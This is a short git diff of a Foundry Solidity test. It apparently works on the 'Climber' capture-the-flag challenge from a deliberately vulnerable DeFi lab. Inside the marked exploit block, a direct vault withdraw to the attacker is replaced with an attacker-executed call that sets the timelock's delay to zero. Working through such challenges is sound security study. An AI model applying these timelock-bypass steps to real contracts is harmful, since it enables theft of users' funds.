@@ -93,20 +93,19 @@ contract Climber is Test {
          * EXPLOIT START *
          */
         address[] memory targets = new address[](1);
-        targets[0] = address(climberVaultProxy);
+        targets[0] = address(climberTimelock);
         uint256[] memory values = new uint256[](1);
         bytes[] memory datas = new bytes[](1);
 
         values[0] = uint256(0);
         datas[0] = abi.encodeWithSignature(
-            "withdraw(address,address,uint256)",
-            address(dvt),
-            address(attacker),
-            VAULT_TOKEN_BALANCE
+            "updateDelay(uint64)",
+            0
         );
         bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
         vm.startPrank(attacker);
         climberTimelock.execute(targets, values, datas, salt);
+        assertEq(0, climberTimelock.delay());
         vm.stopPrank();
         /**
          * EXPLOIT END *
